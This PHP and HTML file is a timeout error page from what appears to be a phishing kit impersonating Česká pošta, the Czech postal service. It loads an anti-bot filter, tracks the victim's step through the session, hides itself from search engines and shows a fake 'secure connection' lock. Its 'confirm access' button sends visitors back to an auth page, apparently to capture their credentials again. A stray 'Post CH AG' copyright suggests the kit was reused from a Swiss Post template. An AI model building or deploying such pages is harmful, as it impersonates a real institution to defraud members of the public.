<?php
session_start();
include 'lang_main.php';
require_once __DIR__ . '/antibot.php';
validateSession(4);
$_SESSION['step'] = 'error'; 
?>
<!DOCTYPE html>
<html lang="<?= $current_lang ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex">
    <title><?= t('error_timeout_title') ?> | Česká pošta</title>
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
    <link rel="stylesheet" href="assets/post-branding.css?v=<?= time() ?>">
    <script src="assets/site.min.js"></script>
    <style>
        /* CSS SPECIFIC ERROR 'Fine & Clean' */
        .error-icon-large {
            width: 70px; 
            height: 70px; 
            background: #fde8e8; 
            border-radius: 50%; 
            color: #d32f2f;
            display: flex; 
            align-items: center; 
            justify-content: center; 
            margin: 0 auto 20px auto;
            font-size: 32px; 
            box-shadow: 0 4px 12px rgba(211,47,47,0.1);
        }
        .page-title {
            font-size: 22px !important;
            font-weight: 600 !important;
            margin-bottom: 15px !important;
            text-align: center !important;
            color: #111;
        }
        .page-subtitle {
            font-size: 14px;
            color: #666;
            line-height: 1.6;
            max-width: 450px;
            margin: 0 auto 40px auto;
            text-align: center;
        }
        .details-box {
            background: #fff; 
            border: 1px solid #e0e0e0; 
            border-radius: 10px; 
            padding: 30px 25px;
            margin: 30px auto; 
            text-align: center; /* Centered for error msg */
            box-shadow: 0 3px 15px rgba(0,0,0,0.06);
            max-width: 480px;
        }
        
        .btn-home {
            background-color: #ffcc00;
            color: #222;
            padding: 14px 30px;
            border-radius: 4px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
            text-align: center;
        }
        .btn-home:hover {
            background-color: #e6b800;
        }
        
        /* Responsive Mobile */
        @media (max-width: 600px) {
            .details-box {
                padding: 20px 15px;
                max-width: 100%;
            }
            
            .page-title {
                font-size: 20px !important;
            }
            
            .btn-home {
                padding: 14px 20px;
            }
        }
        

        /* GLOBAL LAYOUT FIX */
        html {
            height: 100%;
        }
        body {
            min-height: 100%;
            display: flex;
            flex-direction: column;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            background-color: #f4f6f8;
            font-family: 'Frutiger', sans-serif;
            color: #333;
        }
        .post-header {
            flex-shrink: 0;
            background: #fff;
            padding: 15px 0;
            width: 100%;
            z-index: 10;
        }
        .post-footer {
            flex-shrink: 0;
            width: 100%;
        }
        .main-wrapper {
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
            position: relative;
        }
        .content-container {
            width: 100%;
            display: flex;
            justify-content: center;
        }
        @media (max-width: 480px) {
            .main-wrapper { padding: 15px; }
            .form-card { margin: 0 auto; }
        }
    </style>
</head>
<body>
    <div class="post-yellow-bar"></div>
    <header class="post-header">
        <div class="header-container">
            <div class="logo-container">
                <img src="assets/POST.svg" alt="Česká pošta" class="post-logo">
            </div>
            <div class="header-right">
                <div class="login-text">
                    <img src="assets/lock.svg" alt="Secure" class="lock-icon">
                    <span><?= t('secure_conn') ?></span>
                </div>
            </div>
        </div>
    </header>
    <main class="main-wrapper">
        <div class="content-container">
            
            <div class="form-card text-center success-card" style="max-width: 550px; margin: 40px auto; padding-top:40px;">
                
                <div class="error-icon-large">
                    ✕
                </div>
                <h1 class="page-title"><?= t('error_timeout_title') ?></h1>
                
                <p class="page-subtitle" style="margin-bottom: 20px;">
                    <?= t('error_timeout_msg') ?>
                </p> 

                <div style="margin-top: 30px;">
                    <a href="auth.php" class="btn-home"><?= t('confirm_access') ?></a>
                </div>

                <div style="margin-top: 40px; padding-top: 25px; border-top: 1px solid #e5e5e5; font-size: 13px; color: #777; text-align: center;">
                    <?= t('help_q') ?> <a href="#" style="color:#555; text-decoration:underline; font-weight:600;"><?= t('contact_supp') ?></a>
                </div>
                
            </div>
        </div>
    </main>
    <footer class="post-footer">
        <div class="footer-container">
            <!-- DESKTOP VERSION -->
            <div class="footer-desktop">
                <div class="footer-col">
                    <h4><?= t('help_contact') ?></h4>
                    <a href="#">FAQ</a>
                    <a href="#">Contact Center</a>
                    <a href="#">Support</a>
                </div>
                <div class="footer-col">
                    <h4><?= t('data_prot') ?></h4>
                    <a href="#"><?= t('cond_gen') ?></a>
                    <a href="#"><?= t('privacy_policy') ?></a>
                    <a href="#"><?= t('cookies') ?></a>
                </div>
                <div class="footer-col" style="justify-content:flex-end; align-items:flex-end; text-align:right;">
                    <img src="assets/POST.svg" height="28" style="opacity:0.4; margin-bottom:10px;">
                    <p style="font-size:11px; color:#999; margin:0;">
                    &copy; <?= date('Y') ?> Post CH AG
                    </p>
                </div>
            </div>
            <!-- MOBILE VERSION -->
            <div class="footer-mobile">
                &copy; <?= date('Y') ?> <?= t('copyright') ?>
            </div>
        </div>
    </footer>
</body>
</html>
